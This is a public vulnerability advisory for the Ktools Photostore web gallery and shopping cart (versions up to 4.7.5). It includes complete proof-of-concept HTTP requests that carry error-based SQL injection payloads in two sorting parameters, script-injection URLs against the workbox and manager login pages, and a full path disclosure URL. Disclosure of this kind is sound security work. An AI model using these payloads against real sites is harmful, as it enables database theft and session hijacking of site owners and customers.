@@ -1,0 +1,99 @@
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+# Ktools Photostore <= 4.7.5 Multiple Vulnerabilities
+# Bug discovered by Yakir Wizman
+# Date 01/07/2016
+# Affected versions prior to 4.7.5
+# Vendor Homepage - http://www.ktools.net
+
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+#       Author will be not responsible for any damage.
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+# About the Application:
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+# PhotoStore is a professional photo gallery & shopping cart software which contain the following basic features as described bellow:
+#
+# 	Sell various sizes or formats of the same photo.
+# 	Sell photos, vector art, zip files and more.
+# 	Sell videos PhotoStore Pro Only
+# 	Sell prints, artwork, products, packages, digital collections and more.
+# 	Built in shopping cart and ecommerce system to accept credit cards and/or check payments.
+# 	Email notifications to both you and the customer upon purchase.
+# 	Customers can instantly download after payment.
+# 	Customers can instantly download their files after payment.
+# 	Connects to PayPal and 2Checkout.
+# 	Built in credit system to allow your customers to buy credits.
+# 	Allow your members to upload and sell their photos and other media while you take a commission.
+ 
+# The vulnerabilities which are described bellow does not require any legitimate user to exploit them.
+# The Photostore application is prone to a multiple vulnerabilities such as SQL Injection & Cross Site Scripting and does not require any legitimate user or admin privilege to exploit them.
+# A potentially attacker can exploit those vulnerabilities to retrieve all the data stored in the application's database (In case of SQL Injection vulnerability), Cookie Stealing / Phishing attacks (In case of Cross site scripting vulnerability).
+
+
+
+# SQL Injection (error based) Proof-Of-Concept
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+# SQL Injection (Severity is Critical)
+# The vulnerable parameter is “gallerySortType” which is not sanitized and sent by the user in order retrieve the gallery objects ordered by ASC or DESC in sql query.
+# Request Data #1 is:
+
+POST /photostore/gallery/Objects/24/page1/ HTTP/1.1
+Cache-Control: no-cache
+Referer: http://www.example.net/photostore/gallery/Objects/24/page1/
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+Accept-Language: en-us,en;q=0.5
+Host: www.ktoolsdemos.net
+Cookie: PHPSESSID=3eef92499b2e80b0efae88f4d99e5ffe; cart[uniqueOrderID]=F844D7C9C7B2EA3806E501D476D3BF6E; member[umem_id]=C4A01DFEB29A64F53261C12F0F017E90; 09584=eccbc87e4b5ce2fe28308fd9f2a7baf3; pass_4647=eccbc87e4b5ce2fe28308fd9f2a7baf3
+Accept-Encoding: gzip, deflate
+Content-Length: 221
+Content-Type: application/x-www-form-urlencoded
+
+postGalleryForm=1&gallerySortBy=media_id&gallerySortType=asc,[SQL_PAYLOAD]
+
+# Inserted payload for example:
+postGalleryForm=1&gallerySortBy=media_id&gallerySortType=asc,(SELECT 9713 FROM(SELECT COUNT(*),CONCAT(0x71716b6b71,(SELECT (ELT(9713=9713,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+###
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+###
+# The vulnerable parameter is “gallerySortBy” which is not sanitized and sent by the user in order retrieve the gallery objects selected by kind-of-type in sql query.
+# Request Data #2 is:
+
+POST /photostore/gallery/Objects/24/page1/ HTTP/1.1
+Cache-Control: no-cache
+Referer: http://server/photostore/gallery/Objects/24/page1/
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+Accept-Language: en-us,en;q=0.5
+Host: server
+Cookie: PHPSESSID=3eef92499b2e80b0efae88f4d99e5ffe; cart[uniqueOrderID]=F844D7C9C7B2EA3806E501D476D3BF6E; member[umem_id]=C4A01DFEB29A64F53261C12F0F017E90; 09584=eccbc87e4b5ce2fe28308fd9f2a7baf3; pass_4647=eccbc87e4b5ce2fe28308fd9f2a7baf3
+Accept-Encoding: gzip, deflate
+Content-Length: 57
+Content-Type: application/x-www-form-urlencoded
+
+postGalleryForm=1&gallerySortBy=id[SQL_PAYLOAD]&gallerySortType=asc
+
+# Inserted payload for example:
+postGalleryForm=1&gallerySortBy=id AND (SELECT 7522 FROM(SELECT COUNT(*),CONCAT(0x7176787871,(SELECT (ELT(7522=7522,1))),0x716a717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&gallerySortType=asc
+
+
+
+# Cross Site Scripting Proof—Of-Concept
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+# XSS (Severity is Medium)
+# The vulnerable parameter is “mediaID” in “workbox.php” file and the parameter “password” in “/mgr.login.php” file which is not sanitized and sent by the user to the application
+#
+# In Order to exploit this vulnerability, the URL should be like the following examples:
+#
+# http://server/photostore/workbox.php?mode=addToLightbox&mediaID=“><script>alert(/XSS/)</script>
+# http://server/photostore/manager/mgr.login.php?username=demo&password='><script>alert("XSS")</script><input type='hidden
+
+
+# Full path disclosure Proof-Of-Concept
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+# FPD (Severity is low/info)
+# The vulnerable parameter is “photoID” in “productshot.php” file which is partially sanitized and therefor an attacker could exploit this only to full path disclosure.
+#
+# In order to exploit this vulnerability, the url should be like the following example:
+#
+# http://server/photostore/productshot.php?itemID=1&itemType=prod&photoID=%2f&size=125
